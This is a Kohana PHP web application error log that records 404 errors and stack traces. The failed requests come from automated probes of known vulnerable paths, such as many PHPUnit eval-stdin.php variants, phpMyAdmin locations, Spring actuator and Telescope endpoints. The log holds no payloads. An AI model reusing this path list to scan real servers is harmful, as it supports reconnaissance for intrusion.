<?php defined('SYSPATH') OR die('No direct script access.'); ?>

2025-10-29 01:05:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL actuator/gateway/routes was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 01:05:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL actuator/gateway/routes was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 01:17:13 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:17:13 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: hello.world ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: hello.world ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:27 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:27 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:27 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:27 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:27 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:27 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/LICENSE/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/LICENSE/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:30 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:30 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:30 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:30 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:30 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:30 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:30 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:30 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:31 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:31 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:31 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:31 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:31 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:31 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:35 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:35 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 01:49:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 01:49:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 02:16:00 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 02:16:00 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 02:16:00 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL telescope/requests was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 02:16:00 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL telescope/requests was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 02:22:49 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL aaa9 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 02:22:49 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL aaa9 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 02:22:50 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL aab9 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 02:22:50 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL aab9 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 02:52:45 --- ERROR: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
2025-10-29 02:52:45 --- STRACE: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
--
#0 /var/www/html/application/classes/common_config.php(335): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 335, Array)
#1 /var/www/html/application/bootstrap.php(477): require('/var/www/html/a...')
#2 /var/www/html/index.php(107): require('/var/www/html/a...')
#3 {main}
2025-10-29 02:56:25 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL apisix/batch-requests was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 02:56:25 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL apisix/batch-requests was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 03:31:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: hello.world ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 03:31:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: hello.world ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 03:42:56 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/config.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 03:42:56 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/config.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 04:45:10 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: camera-cgi/admin/param.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 04:45:10 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: camera-cgi/admin/param.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 04:51:56 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL actuator/health was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 04:51:56 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL actuator/health was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 04:58:51 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpmyadmin2017/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 04:58:51 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpmyadmin2017/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 04:58:52 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: mysqladmin/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 04:58:52 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: mysqladmin/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 04:58:52 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/pma/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 04:58:52 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/pma/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 04:58:52 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: shopdb/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 04:58:52 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: shopdb/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 04:58:53 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 04:58:53 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 04:58:53 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sql/webadmin/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 04:58:53 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sql/webadmin/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 04:58:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: _phpmyadmin_/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 04:58:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: _phpmyadmin_/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 04:58:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpMyAdmin-4/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 04:58:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpMyAdmin-4/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 04:58:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: program/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 04:58:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: program/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 04:58:55 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: mysql/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 04:58:55 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: mysql/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 04:58:55 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpmyadmin/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 04:58:55 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpmyadmin/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 04:58:56 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpMyAdmin5.1/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 04:58:56 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpMyAdmin5.1/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 05:16:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 05:16:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 05:16:33 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 05:16:33 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 06:26:48 --- ERROR: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
2025-10-29 06:26:48 --- STRACE: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
--
#0 /var/www/html/application/classes/common_config.php(335): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 335, Array)
#1 /var/www/html/application/bootstrap.php(477): require('/var/www/html/a...')
#2 /var/www/html/index.php(107): require('/var/www/html/a...')
#3 {main}
2025-10-29 07:26:00 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
